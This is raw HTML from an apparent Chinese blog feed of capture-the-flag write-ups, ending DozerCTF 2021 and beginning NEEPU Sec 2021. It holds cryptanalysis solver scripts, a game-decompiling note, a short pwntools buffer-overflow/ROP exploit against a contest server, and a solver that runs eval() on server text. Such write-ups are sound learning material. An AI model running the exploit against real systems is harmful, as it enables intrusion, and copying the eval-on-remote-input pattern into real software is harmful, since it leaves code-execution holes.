class="built_in">tuple</span>(ss + bit*mod <span class="keyword">for</span> ss, bit <span class="keyword">in</span> <span class="built_in">zip</span>(sol, bits))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">any</span>(poly(*sol2) <span class="keyword">for</span> poly <span class="keyword">in</span> polys):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                sols2.add(sol2)</span><br><span class="line">        sols = sols2</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sols:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;fail&quot;</span>, i)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sols?&quot;</span>, i, <span class="built_in">len</span>(sols))</span><br><span class="line">    <span class="comment"># TBD: automate adding pad bits to determine right sols by smallness</span></span><br><span class="line">    <span class="keyword">for</span> sol <span class="keyword">in</span> sols:</span><br><span class="line">        <span class="comment"># fix signs</span></span><br><span class="line">        sol = [v <span class="keyword">if</span> v &lt; <span class="number">2</span>**(nbits-<span class="number">1</span>) <span class="keyword">else</span> (v-<span class="number">2</span>**nbits) <span class="keyword">for</span> v <span class="keyword">in</span> sol]</span><br><span class="line">        <span class="comment"># too large solution</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(<span class="built_in">abs</span>(v) &gt;= <span class="number">2</span>**solbits <span class="keyword">for</span> v <span class="keyword">in</span> sol):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># wrong solution</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(poly(*sol) <span class="keyword">for</span> poly <span class="keyword">in</span> hs):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">yield</span> sol</span><br><span class="line">        </span><br><span class="line">R = PolynomialRing(ZZ, names=<span class="string">&#x27;aa1, aa2, bb1, bb2&#x27;</span>)</span><br><span class="line">polys = [R(pol) <span class="keyword">for</span> pol <span class="keyword">in</span> polys]</span><br><span class="line">sols = <span class="built_in">list</span>(recover(polys[:<span class="number">4</span>], R.gens(), BITS))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">ct = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;1df819824bb4299817560c5ee69bd8eaabaf3c47e33a57e39eb1ccddec66d9fb38c6df8ebf35b368ebeecd803d66afb2&quot;</span>)</span><br><span class="line">sol_aa1, sol_aa2, sol_bb1, sol_bb2 = sols[<span class="number">0</span>]</span><br><span class="line">parts = [</span><br><span class="line">    (<span class="built_in">int</span>(x1)+<span class="built_in">int</span>(sol_aa1))^^<span class="built_in">int</span>(x1),</span><br><span class="line">    (<span class="built_in">int</span>(y1)+<span class="built_in">int</span>(sol_bb1))^^<span class="built_in">int</span>(y1),</span><br><span class="line">    (<span class="built_in">int</span>(x2)+<span class="built_in">int</span>(sol_aa2))^^<span class="built_in">int</span>(x2),</span><br><span class="line">    (<span class="built_in">int</span>(y2)+<span class="built_in">int</span>(sol_bb2))^^<span class="built_in">int</span>(y2),</span><br><span class="line">]</span><br><span class="line">key = pack(<span class="string">&quot;&gt;4I&quot;</span>, *parts)</span><br><span class="line"><span class="built_in">print</span>(AES.new(key, mode=AES.MODE_ECB).decrypt(ct).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#DozerCTF&#123;B3y0ND_ThE_4QUIL4_2IFT&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="手滑的袁学长"><a href="#手滑的袁学长" class="headerlink" title="手滑的袁学长"></a>手滑的袁学长</h3><blockquote><p>袁学长出题的时候不小心把密文给删掉几位，现在用$替换了一下，凑活看吧</p></blockquote><p>代码逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">plain:</span><br><span class="line">I do not care th</span><br><span class="line">e result2?9cf037</span><br><span class="line">f8b3a?2b19b5bda9</span><br><span class="line">78c294?5\x00\x00\x00\x00\x00\x00\x00\x00</span><br><span class="line"></span><br><span class="line">key:</span><br><span class="line">2?9cf037f8b3a?2b19b5bda978c294?5</span><br><span class="line"></span><br><span class="line">encrypt:</span><br><span class="line">91e5fb43f053b21ce12e41df0b0ae0bb</span><br><span class="line">6a20c55719151$$fccecb4$$$$$2a27c</span><br><span class="line">8c582c6704f$$$$153bd3313b84235ac</span><br><span class="line">e16a7b3b190$e487abfa9$cf379d1a3c</span><br><span class="line"></span><br><span class="line">algorithm:</span><br><span class="line">c1 = AES(key, p1^f2),  e1=c1^f1</span><br><span class="line">c2 = AES(key, p2^c1),  e2=c2^p1</span><br><span class="line">c3 = AES(key, p3^c2),  e3=c3^p2</span><br><span class="line">c4 = AES(key, p4^c3),  e4=c4^p3</span><br><span class="line">flag = f1+f2</span><br></pre></td></tr></table></figure><p>从 <code>key</code> 和 <code>e4</code> 入手爆破，未知位数3+2=5层循环（16^5=1048576），根据已知条件，枚举求出flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_hex</span>(<span class="params">s, t</span>):</span></span><br><span class="line"><span class="keyword">return</span> strxor(<span class="built_in">bytes</span>.fromhex(s),<span class="built_in">bytes</span>.fromhex(t)).<span class="built_in">hex</span>().rjust(<span class="number">32</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key1 <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> key2 <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> key3 <span class="keyword">in</span> dic:</span><br><span class="line">key = <span class="string">&#x27;2&#123;&#125;9cf037f8b3a&#123;&#125;2b19b5bda978c294&#123;&#125;5&#x27;</span>.<span class="built_in">format</span>(key1,key2,key3)</span><br><span class="line">p1 = <span class="string">b&#x27;I do not care th&#x27;</span>.<span class="built_in">hex</span>()</span><br><span class="line">p2 = <span class="string">b&#x27;e result&#x27;</span>.<span class="built_in">hex</span>() + key[:<span class="number">8</span>].encode().<span class="built_in">hex</span>()</span><br><span class="line">p3 = key[<span class="number">8</span>:<span class="number">24</span>].encode().<span class="built_in">hex</span>()</span><br><span class="line">p4 = key[<span class="number">24</span>:].encode().<span class="built_in">hex</span>() + <span class="string">&#x27;08&#x27;</span>*<span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> e41 <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> e42 <span class="keyword">in</span> dic:</span><br><span class="line">e4 = <span class="string">&#x27;e16a7b3b190&#123;&#125;e487abfa9&#123;&#125;cf379d1a3c&#x27;</span>.<span class="built_in">format</span>(e41,e42)</span><br><span class="line">c4 = xor_hex(e4, p3)</span><br><span class="line">c3 = xor_hex(p4, AES.new(<span class="built_in">bytes</span>.fromhex(key), AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(c4)).<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment">#e3 = 8c582c6704f$$$$153bd3313b84235ac</span></span><br><span class="line">e3 = xor_hex(c3, p2)</span><br><span class="line"><span class="keyword">if</span> e3.startswith(<span class="string">&#x27;8c582c6704f&#x27;</span>) <span class="keyword">and</span> e3.endswith(<span class="string">&#x27;153bd3313b84235ac&#x27;</span>):</span><br><span class="line">c2 = xor_hex(p3, AES.new(<span class="built_in">bytes</span>.fromhex(key), AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(c3)).<span class="built_in">hex</span>())</span><br><span class="line">e2 = xor_hex(c2, p1)</span><br><span class="line"><span class="comment">#e2 = 6a20c55719151$$fccecb4$$$$$2a27c</span></span><br><span class="line"><span class="keyword">if</span> e2.startswith(<span class="string">&#x27;6a20c55719151&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;fccecb4&#x27;</span> <span class="keyword">in</span> e2 <span class="keyword">and</span> e2.endswith(<span class="string">&#x27;2a27c&#x27;</span>):</span><br><span class="line">c1 = xor_hex(p2, AES.new(<span class="built_in">bytes</span>.fromhex(key), AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(c2)).<span class="built_in">hex</span>())</span><br><span class="line">e1 = <span class="string">&#x27;91e5fb43f053b21ce12e41df0b0ae0bb&#x27;</span></span><br><span class="line">f1 = xor_hex(e1, c1)</span><br><span class="line">f2 = xor_hex(p1, AES.new(<span class="built_in">bytes</span>.fromhex(key), AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(c1)).<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(f1)+<span class="built_in">bytes</span>.fromhex(f2))</span><br><span class="line">                            </span><br><span class="line"><span class="comment">#hei_my_bro_this_is_flag_you_know</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="strange-encrypt"><a href="#strange-encrypt" class="headerlink" title="strange encrypt"></a>strange encrypt</h3><blockquote><p>学长学姐说这题应该不难吧？</p></blockquote><p>已知 <code>fl4g</code> 和640次AES加密后的 <code>fl4g_enc</code>，640个生成的<code>key</code> 按 <code>extend_secret</code> 二进制位选择前半段或后半段作为每轮AES使用的 <code>key</code>。</p><p>已知10位 <code>secret</code> 的前两位，对应扩展 <code>extend_secret</code> 为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">extend_secret:</span><br><span class="line">s1=[?,?,?,?,7]</span><br><span class="line">s2=[8,?,?,?,?]</span><br><span class="line">p1=(xxxx xxxx xxxx xxxx 0111)*16</span><br><span class="line">p2=(1000 xxxx xxxx xxxx xxxx)*16</span><br><span class="line">ex=p1+p2</span><br></pre></td></tr></table></figure><p>采用中间人攻击(MITM)，枚举 <code>s1</code> 中未知4位得到<code>fl4g</code> AES加密32次的可能值（16^4=65536），再枚举 <code>s2</code> 中未知4位得到 <code>fl4g_enc</code> AES解密32次的可能值（16^4=65536），两组可能值中相等的即为所求。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">init_key = <span class="string">b&#x27;look_at_here!you_may_need_it!!&#x27;</span></span><br><span class="line">fl4g = <span class="string">b&#x27;fl4g&#123;I_HaTe_The_DaMn_FaKe_FlAg&#125;&#x27;</span></span><br><span class="line">fl4g_enc = <span class="string">&#x27;4b559c0adaf6c14584aea729ed3c544cee8e3ea8cf1d2dc67d620e59c1053976&#x27;</span></span><br><span class="line">flag_enc = <span class="string">&#x27;ed0a40ac74c25e549a92fb90eb07b86ba3de0001a014c2e31c5e0dc6ad8a1fd8cdad1ea856f6b47b4e960bdeb6a447fb&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s + (<span class="number">16</span> - (<span class="built_in">len</span>(s) % <span class="number">16</span>)) * <span class="string">b&#x27;\x11&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genKeys</span>(<span class="params">init</span>):</span></span><br><span class="line">    keys = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">640</span>):</span><br><span class="line">        key = hashlib.md5(init).hexdigest()</span><br><span class="line">        keys.append(key)</span><br><span class="line">        init = key.encode()</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extend</span>(<span class="params">s</span>):</span></span><br><span class="line">    s1 = [ <span class="built_in">int</span>(s[<span class="number">2</span> * i], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">2</span>)]</span><br><span class="line">    s2 = [ <span class="built_in">int</span>(s[<span class="number">2</span> * i + <span class="number">1</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">2</span>)][::-<span class="number">1</span>]</span><br><span class="line">    part1 = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : <span class="string">&#x27;&#123;:&gt;04&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">bin</span>(x)[<span class="number">2</span>:]), s1)) * <span class="number">16</span></span><br><span class="line">    part2 = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : <span class="string">&#x27;&#123;:&gt;04&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">bin</span>(x)[<span class="number">2</span>:]), s2)) * <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> part1 + part2</span><br><span class="line"></span><br><span class="line">keys = genKeys(init_key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i,k <span class="keyword">in</span> <span class="built_in">enumerate</span>(keys):</span><br><span class="line">        b = <span class="built_in">int</span>(ex[i]) &amp; <span class="number">1</span></span><br><span class="line">        key = k[ b * <span class="number">16</span> : (b + <span class="number">1</span>) * <span class="number">16</span>]</span><br><span class="line">        aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        msg = aes.encrypt(msg)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">640</span>-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        b = <span class="built_in">int</span>(ex[i]) &amp; <span class="number">1</span></span><br><span class="line">        key = keys[i][b*<span class="number">16</span>:(b+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">        aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        msg = aes.decrypt(msg)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half_enc</span>(<span class="params">msg, ex</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>):</span><br><span class="line">        b = <span class="built_in">int</span>(ex[i]) &amp; <span class="number">1</span></span><br><span class="line">        key = keys[i][ b * <span class="number">16</span> : (b + <span class="number">1</span>) * <span class="number">16</span>]</span><br><span class="line">        aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        msg = aes.encrypt(msg)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half_dec</span>(<span class="params">msg, ex</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">640</span>-<span class="number">1</span>, <span class="number">320</span>-<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        b = <span class="built_in">int</span>(ex[i-<span class="number">320</span>]) &amp; <span class="number">1</span></span><br><span class="line">        key = keys[i][b*<span class="number">16</span>:(b+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">        aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        msg = aes.decrypt(msg)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line">    </span><br><span class="line">mid = <span class="built_in">dict</span>()</span><br><span class="line"><span class="keyword">for</span> s11 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s12 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s13 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s14 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">s1 = [<span class="number">7</span>, s11, s12, s13, s14]</span><br><span class="line">part1 = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : <span class="string">&#x27;&#123;:&gt;04&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">bin</span>(x)[<span class="number">2</span>:]), s1)) * <span class="number">16</span></span><br><span class="line">m = half_enc(pad(fl4g), part1).<span class="built_in">hex</span>()</span><br><span class="line">mid.update(&#123;m: s1&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(mid))</span><br><span class="line"><span class="keyword">for</span> s22 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s23 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s24 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> s25 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">s2 = [s22, s23, s24, s25, <span class="number">8</span>]</span><br><span class="line">part2 = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : <span class="string">&#x27;&#123;:&gt;04&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">bin</span>(x)[<span class="number">2</span>:]), s2)) * <span class="number">16</span></span><br><span class="line">m = half_dec(<span class="built_in">bytes</span>.fromhex(fl4g_enc), part2).<span class="built_in">hex</span>()</span><br><span class="line"><span class="keyword">if</span> m <span class="keyword">in</span> mid:</span><br><span class="line">s1 = mid[m]</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"><span class="built_in">print</span>(s2)</span><br><span class="line">                    </span><br><span class="line"><span class="comment">#s1 = [7, 15, 9, 11, 15]</span></span><br><span class="line"><span class="comment">#s2 = [8, 4, 13, 15, 8]</span></span><br><span class="line"><span class="comment">#secret = 78ff9db4f8</span></span><br><span class="line"></span><br><span class="line">secret = <span class="string">&#x27;78ff9db4f8&#x27;</span></span><br><span class="line">ex = extend(secret)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encrypt(pad(fl4g)).<span class="built_in">hex</span>() == fl4g_enc)</span><br><span class="line"><span class="built_in">print</span>(decrypt(<span class="built_in">bytes</span>.fromhex(fl4g_enc)) == pad(fl4g))</span><br><span class="line"><span class="built_in">print</span>(decrypt(<span class="built_in">bytes</span>.fromhex(flag_enc)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;Dozerctf&#123;thanks_to_Seniors_and_Sisters&#125;\x11\x11\x11\x11\x11\x11\x11\x11\x11&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="i-wanna-大晚上特供版"><a href="#i-wanna-大晚上特供版" class="headerlink" title="i wanna 大晚上特供版"></a>i wanna 大晚上特供版</h3><blockquote><p>晚上域渗透环境还是老是崩，没事儿来个i wanna 泄泄火，玩就是了 链接：<a href="https://pan.baidu.com/s/14aBNQg90jLDEOOLWhkqrNQ">https://pan.baidu.com/s/14aBNQg90jLDEOOLWhkqrNQ</a> 提取码：4s8s</p></blockquote><p>GameMaker开发的著名I Wanna系列小游戏。</p><p>用 <a href="https://github.com/OpenGMK/GM8Decompiler">GM8Decompiler</a> 把exe恢复为gmk文件，再用 <a href="https://github.com/Medo42/Gmk-Splitter">Gmk-Splitter</a> 提取gmk文件中游戏素材，在图片堆里找到包含flag的一张图片。</p><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="PwnPwnPwn"><a href="#PwnPwnPwn" class="headerlink" title="PwnPwnPwn"></a>PwnPwnPwn</h3><blockquote><p>貌似又是原题，锤爆这个出题人 nc 1.14.160.21 20001</p></blockquote><p>简单ret2text64。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;1.14.160.21&#x27;</span>, <span class="number">20001</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x401176</span></span><br><span class="line">binsh1 = <span class="number">0x401199</span></span><br><span class="line">binsh2 = <span class="number">0x4011f9</span></span><br><span class="line">p_rdi = <span class="number">0x401313</span></span><br><span class="line">p_rsi_r15 = <span class="number">0x401311</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x78</span> + p64(p_rdi) + p64(<span class="number">0xB16BAD</span>) + p64(binsh1) + p64(p_rsi_r15) + p64(<span class="number">0xFEE1DEAD</span>) + p64(<span class="number">0</span>) + p64(p_rdi) + p64(<span class="number">0xBADF00D</span>)  + p64(binsh2) + p64(backdoor)</span><br><span class="line">r.sendline(pay)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;比赛时间：2021年5月29日 9:00-2021年5月30日晚21:30&lt;br&gt;比赛平台：&lt;a href=&quot;http://1.14.160.21:8000/&quot;&gt;http://1.14.160.21:8000/&lt;/a&gt;&lt;/</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>NEEPU Sec 2021公开赛</title>
    <link href="https://lazzzaro.github.io/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/</id>
    <published>2021-05-24T11:40:39.000Z</published>
    <updated>2021-05-24T17:48:45.003Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>东北电力大学校赛，Web综合程度高，Crypto太少了。</p><p>Rank: 3</p><hr><h2 id="Noob"><a href="#Noob" class="headerlink" title="Noob"></a>Noob</h2><h3 id="Linux入门"><a href="#Linux入门" class="headerlink" title="Linux入门"></a>Linux入门</h3><blockquote><p>Linux基本指令</p><p>ls/dir: 访问当前目录</p><p>cat: 获取当前文件内容</p><p>grep: 匹配字符串</p><p>*: 匹配一个或多个字符</p><p>?: 匹配一个字符</p><p>/: 根目录</p><p>hint: Linux的系统配置文件主要放在哪里?</p></blockquote><p>Linux命令大考察。</p><p><code>ls -al</code> 当前目录发现 <code>hint.txt</code></p><p><code>cat hint.txt</code> 查看内容：<code>尝试访问根目录</code></p><p><code>ls -al /</code> 根目录发现<code>flag</code>文件</p><p><code>cat /flag</code> 查看内容：<code>可以尝试grep</code></p><p>在根目录逐个文件夹用<code>grep</code>命令试，在<code>/etc</code>下发现关键字：</p><p><code>grep -r -n &quot;Neepu&#123;&quot; /etc</code></p><p>结果：</p><p><code>/etc/neepu.conf:1:Neepu&#123;f782fecc-2e63-4819-8dd4-f2b2584c85b0&#125;</code></p><p>​    </p><h3 id="最强大脑"><a href="#最强大脑" class="headerlink" title="最强大脑"></a>最强大脑</h3><blockquote><p>不会吧，不会吧，不会有人不喜欢算算术吧…</p></blockquote><p>10s限时算数题，利用python里的requests包处理就好：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://neepusec.club:18495/&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">r = s.get(url)</span><br><span class="line">html = r.text</span><br><span class="line">start = html.index(<span class="string">&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red;  font-size: 70&quot;&gt;&lt;/div&gt;&#x27;</span>)+<span class="built_in">len</span>(<span class="string">&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red;  font-size: 70&quot;&gt;&lt;/div&gt;&#x27;</span>)+<span class="number">8</span></span><br><span class="line">end = start+html[start:].index(<span class="string">&#x27;&amp;nbsp=&amp;nbsp?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">cal = html[start:end].replace(<span class="string">&#x27;&amp;nbsp&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">r = s.post(url,data=&#123;<span class="string">&#x27;answer&#x27;</span>:<span class="built_in">str</span>(<span class="built_in">eval</span>(cal))&#125;)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>((i+<span class="number">1</span>,<span 